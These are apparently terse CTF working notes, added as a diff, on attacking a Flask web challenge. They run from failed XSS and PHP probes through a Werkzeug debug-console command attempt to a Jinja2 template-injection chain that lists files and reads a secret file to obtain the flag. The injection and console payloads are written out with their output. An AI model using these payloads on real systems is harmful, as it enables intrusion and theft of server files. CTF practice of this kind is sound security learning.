@@ -1,0 +1,37 @@
+https://chall03.ctf.bde-kraken.com/note?note=allo
+https://chall03.ctf.bde-kraken.com/note?note=%3Cscript%3Ealert(1)%3C/script%3E
+
+not an XSS
+
+<?php system("ls")>
+i can write html!
+
+<script language="php">system("id")</script>
+not PHP either...
+
+https://portswigger.net/research/http2#introduction -> HTTP 2 stuff
+-> still not
+
+python server -> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
+https://chall03.ctf.bde-kraken.com/console
+
+  var CONSOLE_MODE = true,
+      EVALEX = true,
+      EVALEX_TRUSTED = false,
+      SECRET = "FyLxJx0VT4eVyqMo2tYo";
+
+pin protected
+https://ctftime.org/writeup/17955
+
+console?__debugger__=yes&cmd=__import__('os').popen('whoami').read()%3b&frm=0&s=FyLxJx0VT4eVyqMo2tYo
+-> still not
+
+flask RCE !
+https://ctftime.org/writeup/11014
+
+https://chall03.ctf.bde-kraken.com/note?note={{7*7}}
+{{url_for.__globals__.os.__dict__.listdir('./')}}
+-> My note: ['__pycache__', 'notes.txt', 'admin_secret.txt', 'app.py']
+
+{{url_for.__globals__.__builtins__.open('admin_secret.txt').read()}}
+HDCTF{Sst1_is_th3_Pr0oF_th4t_d3V_Sh0u1D_b3_C4r3FU11_w1tH_PY7h0n} 
